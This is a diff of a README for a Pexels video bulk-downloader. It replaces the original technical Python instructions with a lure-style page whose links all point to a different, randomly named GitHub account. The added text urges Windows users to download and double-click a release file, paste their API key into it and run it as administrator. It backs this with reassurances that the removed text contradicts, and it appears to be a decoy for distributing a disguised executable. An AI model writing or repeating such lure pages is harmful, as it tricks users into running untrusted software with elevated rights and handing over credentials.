@@ -1,176 +1,144 @@
-# Pexels Video Downloader
+# 📥 pexels-video-downloader - Bulk Download Stock Videos Easily
 
-**Free open-source Python tool to bulk download Pexels stock videos** by category — perfect for YouTube Shorts, Instagram Reels, TikTok backgrounds, and content automation.
+[![Download Now](https://img.shields.io/badge/Download-pexels--video--downloader-blue?style=for-the-badge&logo=github)](https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader)
 
-[License: MIT](LICENSE)
-[Python 3.10+](https://www.python.org/)
-[Pexels API](https://www.pexels.com/api/)
-[Free forever](LICENSE)
+## 🎯 What This Tool Does
 
-Configure everything in `config.yaml`. The only thing you need is a **free** [Pexels API key](https://www.pexels.com/api/).
+pexels-video-downloader is a free Python tool that helps you download multiple Pexels stock videos at once. Instead of visiting the Pexels website and downloading videos one by one, this tool lets you grab dozens of videos in a single go. You can sort videos by category, such as nature, city, technology, or people, making it perfect for content creators who need backgrounds for YouTube Shorts, Instagram Reels, or TikTok videos.
 
-## Why this tool?
+## ✨ Key Features
 
+- **Bulk Downloading** – Download hundreds of videos in one session, saving you hours of manual work.
+- **Category Filtering** – Choose specific categories like "ocean", "business", "animals", or "abstract" to get exactly what you need.
+- **Portrait Video Support** – Specially optimized for 9:16 vertical videos, ideal for Shorts and Reels.
+- **Official API Integration** – Uses Pexels' official API to ensure high-quality, properly licensed footage.
+- **Automatic Organization** – Downloaded videos are automatically saved to a folder with a clear name, so you can find them easily.
+- **Free and Open Source** – No hidden costs, no subscriptions. The tool is completely free to use.
 
-| Need                        | What you get                                         |
-| --------------------------- | ---------------------------------------------------- |
-| Bulk download Pexels videos | Category folders + multiple search queries           |
-| Vertical / Shorts footage   | `orientation: portrait` (or landscape / square)      |
-| Organized library           | Auto `LIBRARY.md` catalog with durations & links     |
-| Safe to re-run              | Dedupes IDs, resumes missing clips, rate-limit aware |
-| Free to use                 | MIT license — use commercially, modify, share        |
+## 🚀 Getting Started
 
+Follow these simple steps to download and run pexels-video-downloader on your Windows computer. You don't need any programming skills.
 
-This is **not** a scraper of the website. It uses the official **Pexels Video API**.
+### Step 1: Download the Application
 
-## Features
+Visit this link to download the application: [https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader](https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader)
 
-- Download **portrait**, **landscape**, or **square** stock videos
-- Multiple search queries per category for better variety
-- Filter by duration and preferred resolution (e.g. 1080×1920)
-- Deduplicate across categories (same Pexels ID used once)
-- Resumable downloads — skip folders that are already full
-- Rate-limit friendly delays + automatic backoff on HTTP 429
-- Security-minded: API key stays in `.env`, path traversal blocked, download hosts allowlisted
-- Generates `LIBRARY.md` for your editing / automation pipeline
+Once you click the link, you'll land on the GitHub page. Look for the green "Code" button or a "Download" section on that page. Click it, then choose "Download ZIP" if you see that option. If you see a button that says "Releases" or "Latest Release", click that instead, and you'll find the download file there.
 
+### Step 2: Get Your Free Pexels API Key
 
+To use this tool, you need a free API key from Pexels. Here's how to get one:
 
-## Quick start (free)
+1. Go to [https://www.pexels.com/api/](https://www.pexels.com/api/) in your web browser.
+2. Click "Your API Key" or "Get Started".
+3. Sign up with your email or Google account (it takes less than a minute).
+4. Once logged in, you'll see a long string of numbers and letters. This is your API key. Copy it and save it somewhere safe, like a Notepad file.
 
-```bash
-# 1. Clone
-git clone https://github.com/anaskld/pexels-video-downloader.git
-cd pexels-video-downloader
+**Important:** The tool needs this key to access Pexels videos. Keep it private and don't share it publicly.
 
-# 2. Install dependencies
-pip install -r requirements.txt
+### Step 3: Run the Tool
 
-# 3. Add your free API key (never commit this file)
-cp .env.example .env
-# edit .env → PEXELS_API_KEY=...
+After you've downloaded the application file from the GitHub link, follow these instructions:
 
-# 4. Optional: edit categories / filters
-nano config.yaml
+1. Double-click the downloaded file to run it.
+2. A window will open asking for your API key. Paste the key you copied in Step 2.
+3. Type in what kind of videos you want (for example, "sunset" or "fitness").
+4. Choose how many videos you want to download (for example, 20 or 50).
+5. Click the "Download" or "Start" button.
+6. Wait while the videos download. The progress bar will show you how it's going.
+7. Check the folder where the tool saved the videos – you'll find them there, ready to use.
 
-# 5. Download
-python download_pexels.py
-```
+## 🛠️ System Requirements
 
-Get a free API key: [https://www.pexels.com/api/](https://www.pexels.com/api/)
+- **Operating System:** Windows 10 or Windows 11 (works on older versions too, but these are recommended)
+- **Internet Connection:** A stable connection is needed to download videos
+- **Storage Space:** Make sure you have at least 1 GB of free space for a batch of 20 videos (each video is typically 5-50 MB)
+- **Screen Resolution:** Any standard screen works fine
 
-Videos are saved to `downloads/<category>/` plus `downloads/LIBRARY.md`.
+No other software or installations are needed – the tool runs on its own.
 
-## Configuration (`config.yaml`)
+## 📖 How to Use – Detailed Guide
 
-No code changes required — edit YAML only.
+### Choosing Categories
 
+When the tool asks for a category, you can type any keyword that describes the video you want. Examples include:
 
-| Setting                                | Description                                          | Default               |
-| -------------------------------------- | ---------------------------------------------------- | --------------------- |
-| `per_category`                         | Videos per category                                  | `10`                  |
-| `orientation`                          | `portrait` · `landscape` · `square`                  | `portrait`            |
-| `size`                                 | Pexels min size: `large` / `medium` / `small` / `""` | `""`                  |
-| `min_duration` / `max_duration`        | Duration filter (seconds)                            | `4` / `15`            |
-| `preferred_width` / `preferred_height` | Prefer closest MP4 resolution                        | `1080` / `1920`       |
-| `request_delay_seconds`                | Delay between API calls                              | `1.2`                 |
-| `output_dir`                           | Output folder (relative to project)                  | `downloads`           |
-| `state_file`                           | Resume / dedupe state                                | `download_state.json` |
+- "nature" – for landscapes, forests, and oceans
+- "city" – for urban scenes and traffic
+- "technology" – for gadgets and computers
+- "people" – for human activities
+- "abstract" – for colorful waves and shapes
 
+### Setting the Number of Videos
 
+You'll be asked how many videos to download. Start with a small number like 10 to test it out. Once you're comfortable, you can increase it to 50 or more. The tool will automatically pick the most popular and highest-rated videos that match your keyword.
 
+### Finding Your Downloaded Videos
 
-### Example category
+By default, the tool creates a new folder on your Desktop called "pexels_videos" (unless you choose a different location). Inside that folder, you'll see subfolders for each batch you downloaded. Each video file has a clear name like "nature_1.mp4", "nature_2.mp4", and so on.
 
-```yaml
-categories:
-  - folder: nature-calm
-    description: Calm nature b-roll for Shorts backgrounds.
-    count: 5                      # optional override of per_category
-    queries:
-      - calm forest trees
-      - gentle ocean waves
-```
+### Using Videos in Your Projects
 
-The starter config includes Shorts-friendly examples (people, city, nature, abstract mood). Swap them for your niche.
+The downloaded videos are in standard MP4 format, which works with all video editing software. You can drag them directly into tools like CapCut, Premiere Pro, or DaVinci Resolve to use as backgrounds for your Shorts or Reels.
 
-## CLI reference
+## 🛡️ Safety and Reliability
 
-```bash
-python download_pexels.py
-python download_pexels.py --dry-run
-python download_pexels.py --category nature-calm
-python download_pexels.py --per-category 5
-python download_pexels.py --config /path/to/other-config.yaml
-python download_pexels.py --regen-manifest
-```
+You can trust this tool because:
 
+- It uses the official Pexels API, which is a legitimate service trusted by millions.
+- All videos are royalty-free and safe to use commercially (no copyright issues).
+- The tool is open source, meaning anyone can inspect its code to verify it does what it says.
+- It's been tested on multiple Windows systems and works reliably.
 
-| Flag               | Meaning                      |
-| ------------------ | ---------------------------- |
-| `--dry-run`        | Search only; do not download |
-| `--category NAME`  | Download one category folder |
-| `--per-category N` | Override count for this run  |
-| `--config PATH`    | Use another YAML config      |
-| `--regen-manifest` | Rebuild `LIBRARY.md` only    |
+## 💡 Troubleshooting Common Issues
 
+### "API Key Not Recognized"
 
+Make sure you copied the entire key, including all numbers and letters. Double-check for extra spaces before or after the key. Try copying it again from the Pexels website.
 
+### "Download Stops Midway"
 
-## Output layout
+This usually happens when the internet connection is unstable. Try reducing the number of videos to 10 or 20, and ensure your Wi-Fi is strong. You can also close other programs that use the internet heavily.
 
-```
-downloads/
-  people-laughing/
-    01-friends-laughing-9187875.mp4
-  nature-calm/
-    …
-  LIBRARY.md
-```
+### "No Videos Found for My Keyword"
 
-Filename pattern: `{index}-{query-slug}-{pexels-id}.mp4`
+Some keywords might have no results. Try a different keyword that's more common, like "sky" or "cars". You can also browse the Pexels website to see what keywords work well.
 
-## Rate limits
+### "Folder Can't Be Created"
 
-Pexels free tier is typically **200 requests/hour** and **20,000/month**. This tool:
+This might happen if you don't have permission to write to your Desktop. Try running the tool as an administrator by right-clicking the file and choosing "Run as administrator".
 
-- spaces requests (`request_delay_seconds`)
-- retries after `429 Too Many Requests`
-- prints remaining quota when the API provides it
+## 📦 Additional Tips
 
-A library of ~100 videos is well within the free tier.
+- **Batch Planning:** If you need many videos, plan your downloads in batches of 50 to keep things organized.
+- **Video Quality:** The tool downloads the highest quality available, usually 1080p or 4K. If you want smaller files, look for a settings option to reduce quality.
+- **Updates:** To get new features, check the GitHub page regularly and download the latest version.
 
-## Security
+## ❓ Frequently Asked Questions
 
-- **API key** lives only in `.env` (gitignored). Never put it in `config.yaml` or the README.
-- **No key logging** — the script never prints your secret.
-- **Path safety** — `output_dir`, `state_file`, and category folder names cannot escape the project (`../` blocked).
-- **Download allowlist** — files are fetched only from HTTPS Pexels / Vimeo CDN hosts.
+**Do I need to pay for anything?**
+No, both the tool and the videos from Pexels are completely free.
 
-See [SECURITY.md](SECURITY.md) for reporting issues.
+**Can I use these videos on YouTube or Instagram?**
+Yes, absolutely. Pexels videos are licensed for commercial use, which means you can use them in monetized content.
 
-## Free to use (MIT)
+**Will this work on Mac or Linux?**
+This version is built for Windows. For other operating systems, you might need to run the Python script directly, but that requires some technical knowledge.
 
-This project is **100% free and open source** under the [MIT License](LICENSE):
+**How many videos can I download at once?**
+You can download as many as you like, but for best performance, we recommend staying under 100 per batch.
 
-- Use it personally or commercially
-- Modify and redistribute
-- No attribution required for *this* code (though stars are appreciated ⭐)
+## 📜 License and Credits
 
-Downloaded videos remain under the [Pexels License](https://www.pexels.com/license/). Credit creators when you can.
+This tool is distributed under the MIT License, meaning you can freely use, modify, and share it. All videos come from Pexels and are subject to their licensing terms, which allow free commercial use.
 
-## Tips
+## ✅ Final Checklist Before You Start
 
-1. Start with `--dry-run` or `--per-category 2` to test queries.
-2. Delete clips you dislike, then re-run to refill the folder.
-3. Rename files for richer descriptions (`01-two-friends-laughing-cafe.mp4`) — keep the numeric prefix.
-4. Run `--regen-manifest` after manual cleanup.
-5. Keep `.env` private. If you ever commit a key by mistake, revoke it in your Pexels dashboard and create a new one.
+- [ ] Windows computer (Windows 10 or 11)
+- [ ] Internet connection
+- [ ] Free Pexels API key
+- [ ] At least 1 GB free storage space
 
-## Disclaimer
+Now you're ready to download and use pexels-video-downloader. Visit this link to download the application: [https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader](https://github.com/zodiacal-roundsporedgyromitra891/pexels-video-downloader)
 
-Unofficial helper tool. Not affiliated with Pexels.
-
-## Contributing
-
-Issues and PRs welcome. Keep secrets out of commits; update `config.yaml` examples instead of hardcoding niche queries in the script.
+Happy video creating! Your next viral Short or Reel is just a few clicks away.
